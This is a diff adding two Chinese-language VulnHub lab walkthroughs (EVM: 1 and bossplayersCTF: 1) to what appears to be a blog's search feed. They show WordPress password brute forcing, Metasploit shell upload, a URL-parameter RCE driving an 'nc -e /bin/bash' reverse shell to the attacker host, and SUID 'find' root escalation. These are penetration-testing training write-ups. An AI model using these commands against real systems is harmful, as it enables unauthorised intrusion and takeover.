@@ -4,6 +4,64 @@
   
     
     <entry>
+      <title>EVM-1</title>
+      <link href="/article/EVM-1/"/>
+      <url>/article/EVM-1/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>EVM: 1</h1><hr><p>easyNo.7</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/evm-1,391/">vulnhub靶场-EVM: 1</a></p><p>目标: root</p><p>描述: This is super friendly box intended for Beginner’s</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.103</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap一扫, 嘿! 还挺多</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">53/tcp  open  domain</span><br><span class="line">80/tcp  open  http</span><br><span class="line">110/tcp open  pop3</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">143/tcp open  imap</span><br><span class="line">445/tcp open  microsoft-ds</span><br></pre></td></tr></table></figure><p>dirsearch目录扫描, 居然是wordpress</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[05:46:40] 200 -   22KB - /info.php                                </span><br><span class="line">[05:46:54] 500 -    0B  - /wp-config.php                           </span><br><span class="line">[05:46:55] 200 -    1KB - /wordpress/wp-login.php                  </span><br><span class="line">[05:46:55] 200 -    4KB - /wordpress/  </span><br></pre></td></tr></table></figure><p>从<code>/info.php</code>可以得到似乎开启了disable_functions选项</p><p>尝试爆破一些wordpress的常见用户密码, 无用, 试试之前用的wpscan</p><p>不需要WPScan API Token也能拿到一个用户: c0rrupt3d_brain; 然后同样不需要Token也能进行爆破</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.103/wordpress -e u</span><br><span class="line"><span class="comment"># c0rrupt3d_brain</span></span><br><span class="line">wpscan --url http://192.168.56.103/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt</span><br><span class="line"><span class="comment"># c0rrupt3d_brain : 24992499</span></span><br></pre></td></tr></table></figure><blockquote><p>利用<code>gzip -d rockyou.txt.gz</code>自行解压</p></blockquote><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106191222.png" alt="image.png"></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>可以用msf, 可以手动getshell</p><h3 id="手动"><a class="header-anchor" href="#手动">¶</a>手动</h3><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106195114.png" alt="image.png"></p><p>Update后访问下面这个url去getshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106195250.png" alt="image.png"></p><p>开了disable_functions么? 如开</p><h3 id="msf"><a class="header-anchor" href="#msf">¶</a>msf</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search wordpress</span><br><span class="line">use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class="line">set lhost 192.168.56.5</span><br><span class="line">set rhost 192.168.56.103</span><br><span class="line">set username c0rrupt3d_brain</span><br><span class="line">set password 24992499</span><br><span class="line">set targeturi /wordpress</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux ubuntu-extermely-vulnerable-m4ch1ine 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.4.0-87-generic</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line"><span class="comment"># 查看特权文件, 无</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>虽然是www-data, 但是却可以访问<code>/home</code>下的用户文件</p><p>到达<code>/home/root3r</code>, 太美丽了<code>.root_password_ssh.txt</code>, 直接cat就能拿到看起来像是密码的东西</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">willy26</span><br></pre></td></tr></table></figure><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>尝试切换用户/重新登录, 发现可以切换为root</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106201020.png" alt="image.png"></p><p>然后可以在<code>/root</code>目录下找到祝贺语</p><p>内核的版本比较眼熟, 虽然没有gcc, 但是也可以试一试; 然后就没救了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate linux/local/45010.c</span><br><span class="line">gcc 45010.c -o 45010p -pthread</span><br><span class="line"><span class="comment"># ./45010p: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34&#x27; not found (required by ./45010p)</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 爆破 </tag>
+            
+            <tag> 漏洞利用 </tag>
+            
+            <tag> 信息收集 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>bossplayersCTF-1</title>
+      <link href="/article/bossplayersCTF-1/"/>
+      <url>/article/bossplayersCTF-1/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>bossplayersCTF: 1</h1><hr><p>easyNo.6</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/bossplayersctf-1,375/">vulnhub靶场-bossplayersCTF: 1</a></p><p>目标: root</p><p>描述: Aimed at Beginner Security Professionals who want to get their feet wet into doing some CTF’s.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.19</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap进行主机发现和端口/服务扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -A 192.168.56.19</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>访问80端口, 发现是一些描述, <a href="http://xn--sudocuong-f38nv624cesahb2880a.com">说请你访问sudocuong.com</a>, 其实没有东西;</p><p>查看网页源码, 发现最下面有一行注释:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK</span><br></pre></td></tr></table></figure><p>这是连续三个base64, 解码得到<code>workinginprogress.php</code></p><p>目录扫描发现robots.txt, 里面是不知道谁的&quot;密码&quot;, 解码后看来是没用的东西</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg==</span><br><span class="line">解码: lol try harder bro</span><br></pre></td></tr></table></figure><p>访问<code>workinginprogress.php</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System Install:</span><br><span class="line">Linux Debian - [*]</span><br><span class="line">APACHE2 - [*]</span><br><span class="line">PHP - [*]</span><br><span class="line"></span><br><span class="line">Outstanding:</span><br><span class="line">Test ping command - [ ]</span><br><span class="line">Fix Privilege Escalation - [ ]</span><br><span class="line">Completed:</span><br><span class="line"></span><br><span class="line">Say Hi to Haley - [*]</span><br></pre></td></tr></table></figure><p>这里似乎是一个展示了安装和实现了什么的界面; 既然这个界面存在, 那肯定有存在的理由</p><p>一般能在php文件上使用的方法, 是RCE, 文件包含, 文件上传, 反序列化; 这里可能存在的只能是RCE和文件包含, 我们不知道传参名是什么?那就模糊测试(跑字典)</p><p><a href="https://github.com/SexyBeast233/SecDictionary">实战沉淀字典</a></p><p>利用bp的Intruder模块, 结合参数字典中的关键词字典进行爆破</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106163113.png" alt="image.png"></p><p>都测试一遍后发现是RCE, 参数为cmd, 没有过滤</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106172300.png" alt="image.png"></p><blockquote><p>虚拟机跑字典实在是太慢了, 我建议将网络配置成物理机可以访问的再去爆</p></blockquote><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>其实已经是了, 反弹出来罢了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kali</span><br><span class="line">nc -lvnp 6666</span><br><span class="line"></span><br><span class="line"># target</span><br><span class="line">?cmd=nc -e /bin/bash 192.168.56.5 6666</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106172621.png" alt="image.png"></p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux bossplayers 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.19.0-6-amd64</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line"><span class="comment"># 查看特权文件, find有特权, 那就利用find提权</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>执行命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106173538.png" alt="image.png"></p><p>flag在root下的root.txt中, 解码后为congratulations</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Y29uZ3JhdHVsYXRpb25zCg==</span><br><span class="line"><span class="comment"># congratulations</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 爆破 </tag>
+            
+            <tag> RCE </tag>
+            
+            <tag> find提权 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>mhz_cxf-c1f</title>
       <link href="/article/mhz_cxf-c1f/"/>
       <url>/article/mhz_cxf-c1f/</url>
